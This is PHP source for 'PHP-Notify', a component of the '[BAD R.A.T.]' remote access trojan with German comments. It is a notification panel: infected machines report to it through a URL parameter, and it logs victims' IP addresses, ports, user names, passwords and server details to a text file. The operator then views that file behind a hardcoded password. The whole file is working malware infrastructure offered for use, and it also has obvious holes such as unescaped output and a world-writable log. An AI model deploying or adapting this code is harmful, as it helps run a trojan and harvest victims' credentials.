<?php
/*
#####################################################
#    Name:    PHP-Notify for [BAD R.A.T.]           #
#    Version: 2.2 normal Script                     #
#    Copy by: Mr Hawk [BAD R.A.T.]-Company          #
#    Web:     www.bad-rat.de.vu                     #
#####################################################
# Features:                                         #
# - Aufzeichen der Infos, die vom Server kommen     #
# - Passwortschutz                                  #
# - Beliebige Scriptnamen (passt sich selbst an)    #
# - nur eine Datei                                  #
# - erstellt eigenständig die Log-Datei             #
# - ändert selbstständig den CHMOD der Log-Datei    #
#####################################################
# Syntax:                                           #
# {Scriptname}.php?action=login&send={Parameter}    #
#####################################################
# Config:                                           #
# $seper       = Seperator zwischen den Parametern  #
# $tablehead   = Der Tabellenkopf                   #
# $bgcolor     = Hintergrundfarbe                   #
# $fontcolor   = Schriftfarbe                       #
# $tbbgcolor   = Rahmenfarbe                        #
# $tbfontcolor = Schriftfarbe innerhalb der Tabelle #
# $tbsize      = Tabellenbreite (in px oder in      #
#                % z.B.:700px oder 90%)             #
# $pagepass    = das Passwort                       #
# $savefile    = Die Datei, in der die              #
#                Informationen gespeichert werden   #
#####################################################
*/
//Config
$seper="|";
$tablehead="IP".$seper."Port".$seper."User".$seper."Time".$seper."Date".$seper."Pass".$seper."Server";
$bgcolor="#243C5C";
$fontcolor="#FFFFFF";
$tbbgcolor="#243C5C";
$tbfontcolor="#FFFFFF";
$tbsize="700px";
$pagepass="passwort";
$savefile="notify.txt";
//End Config
global $action,$pass;

echo "<html>\n<head>\n<title>[BAD R.A.T.]-Company PHP-Notify</title>\n<style type=text/css>\n<!--\n";
echo "input \n{border-right: ".$fontcolor." 1px solid; border-top: ".$fontcolor." 1px solid;";
echo "border-left: ".$fontcolor." 1px solid; color: ".$fontcolor." ;";
echo "background-color:".$bgcolor."; border-bottom: ".$fontcolor." 1px solid; }";
echo "-->\n</style>\n</head>\n";
echo "<body text=".$fontcolor." bgcolor=".$bgcolor." link=".$fontcolor." alink=".$fontcolor." vlink=".$fontcolor.">\n";
echo "<center><h1>[BAD R.A.T.]-Company<br> PHP-Notify   </h1>\n\n";

function zerlege($zerstring)
{    global $tbbgcolor,$seper;
        $zerlegt=explode($seper, $zerstring);
        $return='<tr align=center bgcolor='.$tbbgcolor.'>';
        for($i=0; isset($zerlegt[$i]); $i++)
        {$return.='<td>'.$zerlegt[$i].'</td>'."\n";}
        return $return.'</tr>'."\n";
}


switch($action)
{ default:  echo "<form action=".basename($PHP_SELF)." method=get> \n<input type=password  name=pass >&nbsp; <input type=submit name=action value=Check> \n</form>";
  break;

 case 'Check' :
 if ($pass!= $pagepass)echo "<form action=".basename($PHP_SELF)." method=get> \n<input type=password  name=pass >&nbsp; <input type=submit name=action value=Check> \n</form>";
    else
    {
    echo "<table width=".$tbsize." bgcolor=".$tbfontcolor." cellspacing=1 cellpadding=1 border=0>\n ";
    echo zerlege($tablehead);
    if (file_exists($savefile))
      {
      $inhalt=file($savefile);
      for($i=0; isset($inhalt[$i]); $i++)
      {echo zerlege($inhalt[$i]); }
      echo "</table><br><br>";
      }
     }
      break;
case 'login':  $savestring=$send."\n";
               $file=fopen($savefile, "a");
               chmod($savefile,777);
               fputs($file, $savestring);
               fclose($file);
               break;
}
echo "</center>\n</body>\n</html>";?>